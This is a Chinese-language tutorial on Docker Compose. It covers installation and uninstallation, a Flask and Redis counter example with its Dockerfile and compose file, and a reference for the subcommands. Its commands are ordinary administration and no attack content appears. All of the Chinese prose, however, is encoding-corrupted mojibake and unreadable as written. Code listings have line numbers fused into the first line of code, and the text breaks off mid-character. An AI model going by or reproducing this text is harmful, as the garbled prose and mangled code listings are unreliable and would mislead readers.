å¯ä»¥æŠŠå®ƒç†è§£ä¸ºvirtualboxæˆ–è€…vmwareï¼Œæœ€å¼€å§‹åœ¨win7ä¸Šç”¨å¾—æ¯”è¾ƒå¤šï¼Œä½†æ˜¯win10å¼€å§‹è‡ªå¸¦äº†hyper-vè™šæ‹Ÿæœºï¼Œå·²ç»ä¸å†éœ€è¦docker-machineäº†ï¼Œdockerå¯ä»¥ç›´æŽ¥è¿è¡Œåœ¨å®‰è£…äº†Linuxç³»ç»Ÿå¾—hyper-vä¸Šã€‚ dcoker-composeä¸»è¦æ˜¯è§£å†³æœ¬åœ°dockerå®¹å™¨ç¼–æŽ’é—®é¢˜ã€‚ ä¸€èˆ¬æ˜¯é€šè¿‡YAMLé…ç½®æ–‡ä»¶æ¥ä½¿ç”¨å®ƒï¼Œè¿™ä¸ªYAMLæ–‡ä»¶é‡Œèƒ½è®°å½•å¤šä¸ªå®¹å™¨å¯åŠ¨çš„é…ç½®ä¿¡æ¯ï¼ˆé•œåƒã€å¯åŠ¨å‘½ä»¤ã€ç«¯å£æ˜ å°„ç­‰ï¼‰ï¼Œæœ€åŽåªéœ€è¦æ‰§è¡Œdocker-composeå¯¹åº”çš„å‘½ä»¤å°±ä¼šåƒæ‰§è¡Œè„šæœ¬ä¸€æ ·åœ°æ‰¹é‡åˆ›å»ºå’Œé”€æ¯å®¹å™¨ã€‚ docker-swarmdocker-swarmæ˜¯è§£å†³å¤šä¸»æœºå¤šä¸ªå®¹å™¨è°ƒåº¦éƒ¨ç½²å¾—é—®é¢˜ã€‚ swarmæ˜¯åŸºäºŽdockerå¹³å°å®žçŽ°çš„é›†ç¾¤æŠ€æœ¯ï¼Œä»–å¯ä»¥é€šè¿‡å‡ æ¡ç®€å•çš„æŒ‡ä»¤å¿«é€Ÿçš„åˆ›å»ºä¸€ä¸ªdockeré›†ç¾¤ï¼ŒæŽ¥ç€åœ¨é›†ç¾¤çš„å…±äº«ç½‘ç»œä¸Šéƒ¨ç½²åº”ç”¨ï¼Œæœ€ç»ˆå®žçŽ°åˆ†å¸ƒå¼çš„æœåŠ¡ã€‚swarmæŠ€æœ¯ç›¸å½“ä¸æˆç†Ÿï¼Œå¾ˆå¤šé…ç½®åŠŸèƒ½éƒ½æ— æ³•å®žçŽ°ï¼Œåªèƒ½è¯´æ˜¯ä¸ªåŠæˆå“ï¼Œç›®å‰æ›´å¤šçš„æ˜¯ä½¿ç”¨Kubernetesæ¥ç®¡ç†é›†ç¾¤å’Œè°ƒåº¦å®¹å™¨ã€‚ dockerfileä¸Ždocker-composeçš„åŒºåˆ«ç®€å•æ€»ç»“ï¼š dockerfile: æž„å»ºé•œåƒï¼› docker run: å¯åŠ¨å®¹å™¨ï¼› docker-compose: å¯åŠ¨æœåŠ¡ï¼› ç®€è€Œè¨€ä¹‹ï¼Œ Dockerfile å¯ä»¥è®©ç”¨æˆ·ç®¡ç†ä¸€ä¸ªå•ç‹¬çš„åº”ç”¨å®¹å™¨ï¼›è€Œ Compose åˆ™å…è®¸ç”¨æˆ·åœ¨ä¸€ä¸ªå•ç‹¬çš„docker-compose.ymlæ¨¡æ¿æ–‡ä»¶ï¼ˆYAML æ ¼å¼ï¼‰ä¸­å®šä¹‰ä¸€ç»„ç›¸å…³è”çš„åº”ç”¨å®¹å™¨ï¼ˆè¢«ç§°ä¸ºä¸€ä¸ª projectï¼Œå³é¡¹ç›®ï¼‰ï¼Œä¾‹å¦‚ä¸€ä¸ª Web æœåŠ¡å®¹å™¨å†åŠ ä¸ŠåŽç«¯çš„æ•°æ®åº“æœåŠ¡å®¹å™¨ç­‰ã€‚ Docker Compose ä»‹ç»Docker-Compose æ˜¯ Docker çš„ä¸€ç§ç¼–æŽ’æœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªç”¨äºŽåœ¨ Docker ä¸Šå®šä¹‰å¹¶è¿è¡Œå¤æ‚åº”ç”¨çš„å·¥å…·ï¼Œå¯ä»¥è®©ç”¨æˆ·åœ¨é›†ç¾¤ä¸­éƒ¨ç½²åˆ†å¸ƒå¼åº”ç”¨ã€‚ é€šè¿‡ Docker-Compose ç”¨æˆ·å¯ä»¥å¾ˆå®¹æ˜“åœ°ç”¨ä¸€ä¸ªé…ç½®æ–‡ä»¶å®šä¹‰ä¸€ä¸ªå¤šå®¹å™¨çš„åº”ç”¨ï¼Œç„¶åŽä½¿ç”¨ä¸€æ¡æŒ‡ä»¤å®‰è£…è¿™ä¸ªåº”ç”¨çš„æ‰€æœ‰ä¾èµ–ï¼Œå®Œæˆæž„å»ºã€‚Docker-Compose è§£å†³äº†å®¹å™¨ä¸Žå®¹å™¨ä¹‹é—´å¦‚ä½•ç®¡ç†ç¼–æŽ’çš„é—®é¢˜ã€‚ Docker Compose å·¥ä½œåŽŸç†å›¾ Compose ä¸­æœ‰ä¸¤ä¸ªé‡è¦çš„æ¦‚å¿µï¼š æœåŠ¡ (service) ï¼šä¸€ä¸ªåº”ç”¨çš„å®¹å™¨ï¼Œå®žé™…ä¸Šå¯ä»¥åŒ…æ‹¬è‹¥å¹²è¿è¡Œç›¸åŒé•œåƒçš„å®¹å™¨å®žä¾‹ã€‚ é¡¹ç›® (project) ï¼šç”±ä¸€ç»„å…³è”çš„åº”ç”¨å®¹å™¨ç»„æˆçš„ä¸€ä¸ªå®Œæ•´ä¸šåŠ¡å•å…ƒï¼Œåœ¨ docker-compose.yml æ–‡ä»¶ä¸­å®šä¹‰ã€‚ ä¸€ä¸ªé¡¹ç›®å¯ä»¥ç”±å¤šä¸ªæœåŠ¡ï¼ˆå®¹å™¨ï¼‰å…³è”è€Œæˆï¼ŒCompose é¢å‘é¡¹ç›®è¿›è¡Œç®¡ç†ï¼Œé€šè¿‡å­å‘½ä»¤å¯¹é¡¹ç›®ä¸­çš„ä¸€ç»„å®¹å™¨è¿›è¡Œä¾¿æ·åœ°ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚ Compose é¡¹ç›®ç”± Python ç¼–å†™ï¼Œå®žçŽ°ä¸Šè°ƒç”¨äº† Docker æœåŠ¡æä¾›çš„ API æ¥å¯¹å®¹å™¨è¿›è¡Œç®¡ç†ã€‚å› æ­¤ï¼Œåªè¦æ‰€æ“ä½œçš„å¹³å°æ”¯æŒ Docker APIï¼Œå°±å¯ä»¥åœ¨å…¶ä¸Šåˆ©ç”¨ Compose æ¥è¿›è¡Œç¼–æŽ’ç®¡ç†ã€‚ å®‰è£…ä¸Žå¸è½½Compose æ”¯æŒ Linuxã€macOSã€Windows 10 ä¸‰å¤§å¹³å°ã€‚ Compose å¯ä»¥é€šè¿‡ Python çš„åŒ…ç®¡ç†å·¥å…· pip è¿›è¡Œå®‰è£…ï¼Œä¹Ÿå¯ä»¥ç›´æŽ¥ä¸‹è½½ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶ä½¿ç”¨ï¼Œç”šè‡³èƒ½å¤Ÿç›´æŽ¥åœ¨ Docker å®¹å™¨ä¸­è¿è¡Œã€‚ å‰ä¸¤ç§æ–¹å¼æ˜¯ä¼ ç»Ÿæ–¹å¼ï¼Œé€‚åˆæœ¬åœ°çŽ¯å¢ƒä¸‹å®‰è£…ä½¿ç”¨ï¼›æœ€åŽä¸€ç§æ–¹å¼åˆ™ä¸ç ´åç³»ç»ŸçŽ¯å¢ƒï¼Œæ›´é€‚åˆäº‘è®¡ç®—åœºæ™¯ã€‚ Docker for Mac ã€Docker for Windows è‡ªå¸¦ docker-compose äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå®‰è£… Docker ä¹‹åŽå¯ä»¥ç›´æŽ¥ä½¿ç”¨ã€‚ 12# docker-compose --versiondocker-compose version 1.24.1, build 4667896b äºŒè¿›åˆ¶åŒ… åœ¨ Linux ä¸Šçš„ä¹Ÿå®‰è£…ååˆ†ç®€å•ï¼Œä»Ž å®˜æ–¹ GitHub Release å¤„ç›´æŽ¥ä¸‹è½½ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶å³å¯ã€‚ ä¾‹å¦‚ï¼Œåœ¨ Linux 64 ä½ç³»ç»Ÿä¸Šç›´æŽ¥ä¸‹è½½å¯¹åº”çš„äºŒè¿›åˆ¶åŒ…ã€‚ 12$ sudo curl -L https://github.com/docker/compose/releases/download/1.17.1/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose$ sudo chmod +x /usr/local/bin/docker-compose é€šå¸¸ä¹Ÿå¯ä»¥é€šè¿‡apt-getåŒ…ç®¡ç†å®‰è£…docker-compose ä¸åŒçš„å‘è¡Œç‰ˆæœ¬ä¸ä¸€æ ·ï¼Œå…·ä½“è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ å¸è½½ å¦‚æžœæ˜¯äºŒè¿›åˆ¶åŒ…æ–¹å¼å®‰è£…çš„ï¼Œåˆ é™¤äºŒè¿›åˆ¶æ–‡ä»¶å³å¯ã€‚ 1$ sudo rm /usr/local/bin/docker-compose å¦‚æžœæ˜¯é€šè¿‡ pip å®‰è£…çš„ï¼Œåˆ™æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯åˆ é™¤ã€‚ 1$ sudo pip uninstall docker-compose ä½¿ç”¨æœ¯è¯­ é¦–å…ˆä»‹ç»å‡ ä¸ªæœ¯è¯­ã€‚ æœåŠ¡ (service)ï¼šä¸€ä¸ªåº”ç”¨å®¹å™¨ï¼Œå®žé™…ä¸Šå¯ä»¥è¿è¡Œå¤šä¸ªç›¸åŒé•œåƒçš„å®žä¾‹ã€‚ é¡¹ç›® (project)ï¼šç”±ä¸€ç»„å…³è”çš„åº”ç”¨å®¹å™¨ç»„æˆçš„ä¸€ä¸ªå®Œæ•´ä¸šåŠ¡å•å…ƒã€‚ å¯è§ï¼Œä¸€ä¸ªé¡¹ç›®å¯ä»¥ç”±å¤šä¸ªæœåŠ¡ï¼ˆå®¹å™¨ï¼‰å…³è”è€Œæˆï¼ŒCompose é¢å‘é¡¹ç›®è¿›è¡Œç®¡ç†ã€‚ åœºæ™¯ æœ€å¸¸è§çš„é¡¹ç›®æ˜¯ web ç½‘ç«™ï¼Œè¯¥é¡¹ç›®åº”è¯¥åŒ…å« web åº”ç”¨å’Œç¼“å­˜ã€‚ ä¸‹é¢æˆ‘ä»¬ç”¨ Python æ¥å»ºç«‹ä¸€ä¸ªèƒ½å¤Ÿè®°å½•é¡µé¢è®¿é—®æ¬¡æ•°çš„ web ç½‘ç«™ã€‚ web åº”ç”¨ æ–°å»ºæ–‡ä»¶å¤¹ï¼Œåœ¨è¯¥ç›®å½•ä¸­ç¼–å†™ app.py æ–‡ä»¶ 12345678910111213from flask import Flaskfrom redis import Redisapp = Flask(__name__)redis = Redis(host='redis', port=6379)@app.route('/')def hello(): count = redis.incr('hits') return 'Hello World! è¯¥é¡µé¢å·²è¢«è®¿é—® &#123;&#125; æ¬¡ã€‚\n'.format(count)if __name__ == "__main__": app.run(host="0.0.0.0", debug=True) Dockerfile ç¼–å†™ Dockerfile æ–‡ä»¶ï¼Œå†…å®¹ä¸º 12345FROM python:3.6-alpineADD . /codeWORKDIR /codeRUN pip install redis flaskCMD ["python", "app.py"] docker-compose.yml ç¼–å†™ docker-compose.yml æ–‡ä»¶ï¼Œè¿™ä¸ªæ˜¯ Compose ä½¿ç”¨çš„ä¸»æ¨¡æ¿æ–‡ä»¶ã€‚ 12345678910version: '3'services: web: build: . ports: - "5000:5000" redis: image: "redis:alpine" è¿è¡Œ compose é¡¹ç›® 1$ docker-compose up æ­¤æ—¶è®¿é—®æœ¬åœ° 5000 ç«¯å£ï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢ï¼Œè®¡æ•°å°±ä¼šåŠ  1ã€‚ å‘½ä»¤è¯´æ˜Žå‘½ä»¤å¯¹è±¡ä¸Žæ ¼å¼ å¯¹äºŽ Compose æ¥è¯´ï¼Œå¤§éƒ¨åˆ†å‘½ä»¤çš„å¯¹è±¡æ—¢å¯ä»¥æ˜¯é¡¹ç›®æœ¬èº«ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºé¡¹ç›®ä¸­çš„æœåŠ¡æˆ–è€…å®¹å™¨ã€‚å¦‚æžœæ²¡æœ‰ç‰¹åˆ«çš„è¯´æ˜Žï¼Œå‘½ä»¤å¯¹è±¡å°†æ˜¯é¡¹ç›®ï¼Œè¿™æ„å‘³ç€é¡¹ç›®ä¸­æ‰€æœ‰çš„æœåŠ¡éƒ½ä¼šå—åˆ°å‘½ä»¤å½±å“ã€‚ æ‰§è¡Œ docker-compose [COMMAND] --help æˆ–è€… docker-compose help [COMMAND] å¯ä»¥æŸ¥çœ‹å…·ä½“æŸä¸ªå‘½ä»¤çš„ä½¿ç”¨æ ¼å¼ã€‚ docker-compose å‘½ä»¤çš„åŸºæœ¬çš„ä½¿ç”¨æ ¼å¼æ˜¯ 1docker-compose [-f=&lt;arg&gt;...] [options] [COMMAND] [ARGS...] å‘½ä»¤é€‰é¡¹ -f, --file FILE æŒ‡å®šä½¿ç”¨çš„ Compose æ¨¡æ¿æ–‡ä»¶ï¼Œé»˜è®¤ä¸º docker-compose.ymlï¼Œå¯ä»¥å¤šæ¬¡æŒ‡å®šã€‚ -p, --project-name NAME æŒ‡å®šé¡¹ç›®åç§°ï¼Œé»˜è®¤å°†ä½¿ç”¨æ‰€åœ¨ç›®å½•åç§°ä½œä¸ºé¡¹ç›®åã€‚ --x-networking ä½¿ç”¨ Docker çš„å¯æ‹”æ’ç½‘ç»œåŽç«¯ç‰¹æ€§ --x-network-driver DRIVER æŒ‡å®šç½‘ç»œåŽç«¯çš„é©±åŠ¨ï¼Œé»˜è®¤ä¸º bridge --verbose è¾“å‡ºæ›´å¤šè°ƒè¯•ä¿¡æ¯ã€‚ -v, --version æ‰“å°ç‰ˆæœ¬å¹¶é€€å‡ºã€‚ å‘½ä»¤ä½¿ç”¨è¯´æ˜Ž buildæ ¼å¼ä¸º docker-compose build [options] [SERVICE...]ã€‚ æž„å»ºï¼ˆé‡æ–°æž„å»ºï¼‰é¡¹ç›®ä¸­çš„æœåŠ¡å®¹å™¨ã€‚ æœåŠ¡å®¹å™¨ä¸€æ—¦æž„å»ºåŽï¼Œå°†ä¼šå¸¦ä¸Šä¸€ä¸ªæ ‡è®°åï¼Œä¾‹å¦‚å¯¹äºŽ web é¡¹ç›®ä¸­çš„ä¸€ä¸ª db å®¹å™¨ï¼Œå¯èƒ½æ˜¯ web_dbã€‚ å¯ä»¥éšæ—¶åœ¨é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œ docker-compose build æ¥é‡æ–°æž„å»ºæœåŠ¡ã€‚ é€‰é¡¹åŒ…æ‹¬ï¼š é€‰é¡¹åŒ…æ‹¬ï¼š â€“force-rm åˆ é™¤æž„å»ºè¿‡ç¨‹ä¸­çš„ä¸´æ—¶å®¹å™¨ã€‚ â€“no-cache æž„å»ºé•œåƒè¿‡ç¨‹ä¸­ä¸ä½¿ç”¨ cacheï¼ˆè¿™å°†åŠ é•¿æž„å»ºè¿‡ç¨‹ï¼‰ã€‚ â€“pull å§‹ç»ˆå°è¯•é€šè¿‡ pull æ¥èŽ·å–æ›´æ–°ç‰ˆæœ¬çš„é•œåƒã€‚ config éªŒè¯ Compose æ–‡ä»¶æ ¼å¼æ˜¯å¦æ­£ç¡®ï¼Œè‹¥æ­£ç¡®åˆ™æ˜¾ç¤ºé…ç½®ï¼Œè‹¥æ ¼å¼é”™è¯¯æ˜¾ç¤ºé”™è¯¯åŽŸå›  down æ­¤å‘½ä»¤å°†ä¼šåœæ­¢ up å‘½ä»¤æ‰€å¯åŠ¨çš„å®¹å™¨ï¼Œå¹¶ç§»é™¤ç½‘ç»œ exec è¿›å…¥æŒ‡å®šçš„å®¹å™¨ã€‚ help èŽ·å¾—ä¸€ä¸ªå‘½ä»¤çš„å¸®åŠ©ã€‚ images åˆ—å‡º Compose æ–‡ä»¶ä¸­åŒ…å«çš„é•œåƒã€‚ kill æ ¼å¼ä¸º docker-compose kill [options] [SERVICE...]ã€‚ é€šè¿‡å‘é€ SIGKILL ä¿¡å·æ¥å¼ºåˆ¶åœæ­¢æœåŠ¡å®¹å™¨ã€‚ æ”¯æŒé€šè¿‡ -s å‚æ•°æ¥æŒ‡å®šå‘é€çš„ä¿¡å·ï¼Œä¾‹å¦‚é€šè¿‡å¦‚ä¸‹æŒ‡ä»¤å‘é€ SIGINT ä¿¡å·ã€‚ 1$ docker-compose kill -s SIGINT logs æ ¼å¼ä¸º docker-compose logs [options] [SERVICE...]ã€‚ æŸ¥çœ‹æœåŠ¡å®¹å™¨çš„è¾“å‡ºã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œdocker-compose å°†å¯¹ä¸åŒçš„æœåŠ¡è¾“å‡ºä½¿ç”¨ä¸åŒçš„é¢œè‰²æ¥åŒºåˆ†ã€‚å¯ä»¥é€šè¿‡ --no-color æ¥å…³é—­é¢œè‰²ã€‚ è¯¥å‘½ä»¤åœ¨è°ƒè¯•é—®é¢˜çš„æ—¶å€™ååˆ†æœ‰ç”¨ã€‚ pause æ ¼å¼ä¸º docker-compose pause [SERVICE...]ã€‚ æš‚åœä¸€ä¸ªæœåŠ¡å®¹å™¨ã€‚ port æ ¼å¼ä¸º docker-compose port [options] SERVICE PRIVATE_PORTã€‚ æ‰“å°æŸä¸ªå®¹å™¨ç«¯å£æ‰€æ˜ å°„çš„å…¬å…±ç«¯å£ã€‚ é€‰é¡¹ï¼š â€“protocol=proto æŒ‡å®šç«¯å£åè®®ï¼Œtcpï¼ˆé»˜è®¤å€¼ï¼‰æˆ–è€… udpã€‚ â€“index=index å¦‚æžœåŒä¸€æœåŠ¡å­˜åœ¨å¤šä¸ªå®¹å™¨ï¼ŒæŒ‡å®šå‘½ä»¤å¯¹è±¡å®¹å™¨çš„åºå·ï¼ˆé»˜è®¤ä¸º 1ï¼‰ã€‚ ps æ ¼å¼ä¸º docker-compose ps [options] [SERVICE...]ã€‚ åˆ—å‡ºé¡¹ç›®ä¸­ç›®å‰çš„æ‰€æœ‰å®¹å™¨ã€‚ é€‰é¡¹ï¼š -q åªæ‰“å°å®¹å™¨çš„ ID ä¿¡æ¯ã€‚ pull æ ¼å¼ä¸º docker-compose pull [options] [SERVICE...]ã€‚ æ‹‰å–æœåŠ¡ä¾èµ–çš„é•œåƒã€‚ é€‰é¡¹ï¼š â€“ignore-pull-failures å¿½ç•¥æ‹‰å–é•œåƒè¿‡ç¨‹ä¸­çš„é”™è¯¯ã€‚ push æŽ¨é€æœåŠ¡ä¾èµ–çš„é•œåƒåˆ° Docker é•œåƒä»“åº“ã€‚ restart æ ¼å¼ä¸º docker-compose restart [options] [SERVICE...]ã€‚ é‡å¯é¡¹ç›®ä¸­çš„æœåŠ¡ã€‚ é€‰é¡¹ï¼š -t, â€“timeout TIMEOUT æŒ‡å®šé‡å¯å‰åœæ­¢å®¹å™¨çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚ rmæ ¼å¼ä¸º docker-compose rm [options] [SERVICE...]ã€‚ åˆ é™¤æ‰€æœ‰ï¼ˆåœæ­¢çŠ¶æ€çš„ï¼‰æœåŠ¡å®¹å™¨ã€‚æŽ¨èå…ˆæ‰§è¡Œ docker-compose stop å‘½ä»¤æ¥åœæ­¢å®¹å™¨ã€‚ é€‰é¡¹ï¼š -f, â€“force å¼ºåˆ¶ç›´æŽ¥åˆ é™¤ï¼ŒåŒ…æ‹¬éžåœæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚ä¸€èˆ¬å°½é‡ä¸è¦ä½¿ç”¨è¯¥é€‰é¡¹ã€‚ -v åˆ é™¤å®¹å™¨æ‰€æŒ‚è½½çš„æ•°æ®å·ã€‚ run æ ¼å¼ä¸º docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]ã€‚ åœ¨æŒ‡å®šæœåŠ¡ä¸Šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚ ä¾‹å¦‚ï¼š 1$ docker-compose run ubuntu ping docker.com å°†ä¼šå¯åŠ¨ä¸€ä¸ª ubuntu æœåŠ¡å®¹å™¨ï¼Œå¹¶æ‰§è¡Œ ping docker.com å‘½ä»¤ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æžœå­˜åœ¨å…³è”ï¼Œåˆ™æ‰€æœ‰å…³è”çš„æœåŠ¡å°†ä¼šè‡ªåŠ¨è¢«å¯åŠ¨ï¼Œé™¤éžè¿™äº›æœåŠ¡å·²ç»åœ¨è¿è¡Œä¸­ã€‚ è¯¥å‘½ä»¤ç±»ä¼¼å¯åŠ¨å®¹å™¨åŽè¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼Œç›¸å…³å·ã€é“¾æŽ¥ç­‰ç­‰éƒ½å°†ä¼šæŒ‰ç…§é…ç½®è‡ªåŠ¨åˆ›å»ºã€‚ ä¸¤ä¸ªä¸åŒç‚¹ï¼š ç»™å®šå‘½ä»¤å°†ä¼šè¦†ç›–åŽŸæœ‰çš„è‡ªåŠ¨è¿è¡Œå‘½ä»¤ï¼› ä¸ä¼šè‡ªåŠ¨åˆ›å»ºç«¯å£ï¼Œä»¥é¿å…å†²çªã€‚ å¦‚æžœä¸å¸Œæœ›è‡ªåŠ¨å¯åŠ¨å…³è”çš„å®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨ --no-deps é€‰é¡¹ï¼Œä¾‹å¦‚ 1$ docker-compose run --no-deps web python manage.py shell å°†ä¸ä¼šå¯åŠ¨ web å®¹å™¨æ‰€å…³è”çš„å…¶å®ƒå®¹å™¨ã€‚ é€‰é¡¹ï¼š 12345678910111213141516171819-d åŽå°è¿è¡Œå®¹å™¨ã€‚--name NAME ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåå­—ã€‚--entrypoint CMD è¦†ç›–é»˜è®¤çš„å®¹å™¨å¯åŠ¨æŒ‡ä»¤ã€‚-e KEY=VAL è®¾ç½®çŽ¯å¢ƒå˜é‡å€¼ï¼Œå¯å¤šæ¬¡ä½¿ç”¨é€‰é¡¹æ¥è®¾ç½®å¤šä¸ªçŽ¯å¢ƒå˜é‡ã€‚-u, --user="" æŒ‡å®šè¿è¡Œå®¹å™¨çš„ç”¨æˆ·åæˆ–è€… uidã€‚--no-deps ä¸è‡ªåŠ¨å¯åŠ¨å…³è”çš„æœåŠ¡å®¹å™¨ã€‚--rm è¿è¡Œå‘½ä»¤åŽè‡ªåŠ¨åˆ é™¤å®¹å™¨ï¼Œd æ¨¡å¼ä¸‹å°†å¿½ç•¥ã€‚-p, --publish=[] æ˜ å°„å®¹å™¨ç«¯å£åˆ°æœ¬åœ°ä¸»æœºã€‚--service-ports é…ç½®æœåŠ¡ç«¯å£å¹¶æ˜ å°„åˆ°æœ¬åœ°ä¸»æœºã€‚-T ä¸åˆ†é…ä¼ª ttyï¼Œæ„å‘³ç€ä¾èµ– tty çš„æŒ‡ä»¤å°†æ— æ³•è¿è¡Œã€‚ scale æ ¼å¼ä¸º docker-compose scale [options] [SERVICE=NUM...]ã€‚ è®¾ç½®æŒ‡å®šæœåŠ¡è¿è¡Œçš„å®¹å™¨ä¸ªæ•°ã€‚ é€šè¿‡ service=num çš„å‚æ•°æ¥è®¾ç½®æ•°é‡ã€‚ä¾‹å¦‚ï¼š 1$ docker-compose scale web=3 db=2 å°†å¯åŠ¨ 3 ä¸ªå®¹å™¨è¿è¡Œ web æœåŠ¡ï¼Œ2 ä¸ªå®¹å™¨è¿è¡Œ db æœåŠ¡ã€‚ ä¸€èˆ¬çš„ï¼Œå½“æŒ‡å®šæ•°ç›®å¤šäºŽè¯¥æœåŠ¡å½“å‰å®žé™…è¿è¡Œå®¹å™¨ï¼Œå°†æ–°åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨ï¼›åä¹‹ï¼Œå°†åœæ­¢å®¹å™¨ã€‚ é€‰é¡¹ï¼š -t, â€“timeout TIMEOUT åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚ start æ ¼å¼ä¸º docker-compose start [SERVICE...]ã€‚ å¯åŠ¨å·²ç»å­˜åœ¨çš„æœåŠ¡å®¹å™¨ã€‚ stop æ ¼å¼ä¸º docker-compose stop [options] [SERVICE...]ã€‚ åœæ­¢å·²ç»å¤„äºŽè¿è¡ŒçŠ¶æ€çš„å®¹å™¨ï¼Œä½†ä¸åˆ é™¤å®ƒã€‚é€šè¿‡ docker-compose start å¯ä»¥å†æ¬¡å¯åŠ¨è¿™äº›å®¹å™¨ã€‚ é€‰é¡¹ï¼š -t, â€“timeout TIMEOUT åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚ top æŸ¥çœ‹å„ä¸ªæœåŠ¡å®¹å™¨å†…è¿è¡Œçš„è¿›ç¨‹ã€‚ unpause æ ¼å¼ä¸º docker-compose unpause [SERVICE...]ã€‚ æ¢å¤å¤„äºŽæš‚åœçŠ¶æ€ä¸­çš„æœåŠ¡ã€‚ up æ ¼å¼ä¸º docker-compose up [options] [SERVICE...]ã€‚ è¯¥å‘½ä»¤ååˆ†å¼ºå¤§ï¼Œå®ƒå°†å°è¯•è‡ªåŠ¨å®ŒæˆåŒ…æ‹¬æž„å»ºé•œåƒï¼Œï¼ˆé‡æ–°ï¼‰åˆ›å»ºæœåŠ¡ï¼Œå¯åŠ¨æœåŠ¡ï¼Œå¹¶å…³è”æœåŠ¡ç›¸å…³å®¹å™¨çš„ä¸€ç³»åˆ—æ“ä½œã€‚ é“¾æŽ¥çš„æœåŠ¡éƒ½å°†ä¼šè¢«è‡ªåŠ¨å¯åŠ¨ï¼Œé™¤éžå·²ç»å¤„äºŽè¿è¡ŒçŠ¶æ€ã€‚ å¯ä»¥è¯´ï¼Œå¤§éƒ¨åˆ†æ—¶å€™éƒ½å¯ä»¥ç›´æŽ¥é€šè¿‡è¯¥å‘½ä»¤æ¥å¯åŠ¨ä¸€ä¸ªé¡¹ç›®ã€‚ é»˜è®¤æƒ…å†µï¼Œdocker-compose up å¯åŠ¨çš„å®¹å™¨éƒ½åœ¨å‰å°ï¼ŒæŽ§åˆ¶å°å°†ä¼šåŒæ—¶æ‰“å°æ‰€æœ‰å®¹å™¨çš„è¾“å‡ºä¿¡æ¯ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿è¿›è¡Œè°ƒè¯•ã€‚ å½“é€šè¿‡ Ctrl-C åœæ­¢å‘½ä»¤æ—¶ï¼Œæ‰€æœ‰å®¹å™¨å°†ä¼šåœæ­¢ã€‚ å¦‚æžœä½¿ç”¨ docker-compose up -dï¼Œå°†ä¼šåœ¨åŽå°å¯åŠ¨å¹¶è¿è¡Œæ‰€æœ‰çš„å®¹å™¨ã€‚ä¸€èˆ¬æŽ¨èç”Ÿäº§çŽ¯å¢ƒä¸‹ä½¿ç”¨è¯¥é€‰é¡¹ã€‚ é»˜è®¤æƒ…å†µï¼Œå¦‚æžœæœåŠ¡å®¹å™¨å·²ç»å­˜åœ¨ï¼Œdocker-compose up å°†ä¼šå°è¯•åœæ­¢å®¹å™¨ï¼Œç„¶åŽé‡æ–°åˆ›å»ºï¼ˆä¿æŒä½¿ç”¨ volumes-from æŒ‚è½½çš„å·ï¼‰ï¼Œä»¥ä¿è¯æ–°å¯åŠ¨çš„æœåŠ¡åŒ¹é… docker-compose.yml æ–‡ä»¶çš„æœ€æ–°å†…å®¹ã€‚å¦‚æžœç”¨æˆ·ä¸å¸Œæœ›å®¹å™¨è¢«åœæ­¢å¹¶é‡æ–°åˆ›å»ºï¼Œå¯ä»¥ä½¿ç”¨ docker-compose up â€“no-recreateã€‚è¿™æ ·å°†åªä¼šå¯åŠ¨å¤„äºŽåœæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œè€Œå¿½ç•¥å·²ç»è¿è¡Œçš„æœåŠ¡ã€‚å¦‚æžœç”¨æˆ·åªæƒ³é‡æ–°éƒ¨ç½²æŸä¸ªæœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ docker-compose up â€“no-deps -d &lt;SERVICE_NAME&gt; æ¥é‡æ–°åˆ›å»ºæœåŠ¡å¹¶åŽå°åœæ­¢æ—§æœåŠ¡ï¼Œå¯åŠ¨æ–°æœåŠ¡ï¼Œå¹¶ä¸ä¼šå½±å“åˆ°å…¶æ‰€ä¾èµ–çš„æœåŠ¡ã€‚ é€‰é¡¹ï¼š 12345678910111213-d åœ¨åŽå°è¿è¡ŒæœåŠ¡å®¹å™¨ã€‚--no-color ä¸ä½¿ç”¨é¢œè‰²æ¥åŒºåˆ†ä¸åŒçš„æœåŠ¡çš„æŽ§åˆ¶å°è¾“å‡ºã€‚--no-deps ä¸å¯åŠ¨æœåŠ¡æ‰€é“¾æŽ¥çš„å®¹å™¨ã€‚--force-recreate å¼ºåˆ¶é‡æ–°åˆ›å»ºå®¹å™¨ï¼Œä¸èƒ½ä¸Ž --no-recreate åŒæ—¶ä½¿ç”¨ã€‚--no-recreate å¦‚æžœå®¹å™¨å·²ç»å­˜åœ¨äº†ï¼Œåˆ™ä¸é‡æ–°åˆ›å»ºï¼Œä¸èƒ½ä¸Ž --force-recreate åŒæ—¶ä½¿ç”¨ã€‚--no-build ä¸è‡ªåŠ¨æž„å»ºç¼ºå¤±çš„æœåŠ¡é•œåƒã€‚-t, --timeout TIMEOUT åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚ version æ 